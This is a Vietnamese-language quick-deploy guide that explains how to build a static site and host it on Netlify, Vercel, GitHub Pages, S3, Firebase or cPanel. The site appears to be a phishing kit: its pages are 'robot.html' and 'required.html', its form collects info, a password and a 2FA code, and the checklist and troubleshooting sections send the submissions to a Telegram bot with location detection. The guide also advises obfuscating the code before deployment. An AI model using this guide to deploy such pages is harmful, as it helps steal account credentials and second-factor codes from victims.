# 🚀 Quick Deploy Guide

## Bước 1: Build Production

### Windows
```bash
build.bat
```

### Linux/Mac
```bash
./build.sh
```

### NPM
```bash
npm run build
```

✅ File production sẽ được tạo trong thư mục `dist/`

---

## Bước 2: Deploy lên Server

### 🌐 1. cPanel / Traditional Hosting

1. Truy cập File Manager trong cPanel
2. Vào thư mục `public_html/`
3. Upload **toàn bộ nội dung** trong `dist/`:
   - required.html
   - robot.html
   - public/ (thư mục)
4. Truy cập: `https://yourdomain.com/robot.html`

### 📦 2. Netlify (Miễn phí)

#### Cách 1: Drag & Drop
1. Vào https://app.netlify.com/drop
2. Kéo thả thư mục `dist/` vào
3. Done! Nhận được URL miễn phí

#### Cách 2: CLI
```bash
npm install -g netlify-cli
netlify login
netlify deploy --dir=dist --prod
```

### ▲ 3. Vercel (Miễn phí)

```bash
npm install -g vercel
vercel login
cd dist
vercel --prod
```

### 📄 4. GitHub Pages (Miễn phí)

```bash
# Tạo repo trên GitHub
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/USERNAME/REPO.git
git push -u origin main

# Deploy dist folder
git subtree push --prefix dist origin gh-pages

# Access: https://USERNAME.github.io/REPO/robot.html
```

### ☁️ 5. AWS S3 + CloudFront

```bash
# Upload to S3
aws s3 sync dist/ s3://your-bucket-name/ --delete

# Enable static website hosting in S3 console
# Point CloudFront to S3 bucket
```

### 🔥 6. Firebase Hosting (Miễn phí)

```bash
npm install -g firebase-tools
firebase login
firebase init hosting

# Chọn dist/ làm public directory
firebase deploy
```

### 🌊 7. DigitalOcean App Platform

1. Push code lên GitHub
2. Connect repo to DigitalOcean
3. Set build command: `npm run build`
4. Set output directory: `dist`
5. Deploy!

---

## Bước 3: Cấu hình Domain (Optional)

### Netlify
1. Site settings → Domain management
2. Add custom domain
3. Update DNS records

### Vercel
1. Project settings → Domains
2. Add domain
3. Update DNS records

### cPanel
- Domain đã tự động configure

---

## 📝 Checklist Deploy

### Trước khi deploy:
- [ ] Build production (`build.bat`)
- [ ] Test trong `dist/` folder
- [ ] Check config.js (Telegram tokens)
- [ ] Test trên nhiều browsers
- [ ] Test responsive mobile

### Sau khi deploy:
- [ ] Test live URL
- [ ] Check console errors
- [ ] Test form submission
- [ ] Test Telegram notifications
- [ ] Test location detection

---

## 🔧 Update Code Sau Deploy

1. Sửa code trong source (không phải dist/)
2. Build lại:
   ```bash
   build.bat
   ```
3. Upload lại thư mục `dist/` lên server

---

## 📊 Platform So Sánh

| Platform | Miễn phí | Custom Domain | SSL | CDN | Dễ dùng |
|----------|----------|---------------|-----|-----|---------|
| Netlify | ✅ | ✅ | ✅ | ✅ | ⭐⭐⭐⭐⭐ |
| Vercel | ✅ | ✅ | ✅ | ✅ | ⭐⭐⭐⭐⭐ |
| GitHub Pages | ✅ | ✅ | ✅ | ✅ | ⭐⭐⭐⭐ |
| Firebase | ✅ | ✅ | ✅ | ✅ | ⭐⭐⭐⭐ |
| cPanel | ❌ | ✅ | ⚠️ | ❌ | ⭐⭐⭐ |
| AWS S3 | ⚠️ | ✅ | ✅ | ✅ | ⭐⭐ |

**Recommendation:** Netlify hoặc Vercel cho deployment nhanh và miễn phí!

---

## 🐛 Troubleshooting

### Website không load
- Check file paths trong HTML
- Đảm bảo `public/` folder được upload
- Check browser console errors

### Telegram không nhận được messages
- Check Telegram bot token trong `config.js`
- Test bot token: https://api.telegram.org/bot{TOKEN}/getMe
- Check chat ID đúng chưa

### CSS/JS không load
- Check file paths relative `./public/...`
- Clear browser cache
- Check file đã upload đúng chưa

### Form không submit
- Open browser DevTools (F12)
- Check Console tab cho errors
- Test từng step: Info → Password → 2FA

---

## 🔐 Security Tips

1. ✅ Luôn dùng HTTPS (SSL)
2. ✅ Obfuscate code trước deploy
3. ✅ Không commit sensitive data
4. ✅ Update Telegram tokens định kỳ
5. ✅ Monitor access logs

---

## 📞 Support

Nếu gặp vấn đề:
1. Check BUILD_GUIDE.md
2. Check browser console
3. Test local trong dist/ trước
4. Verify all files uploaded

---

Happy deploying! 🚀

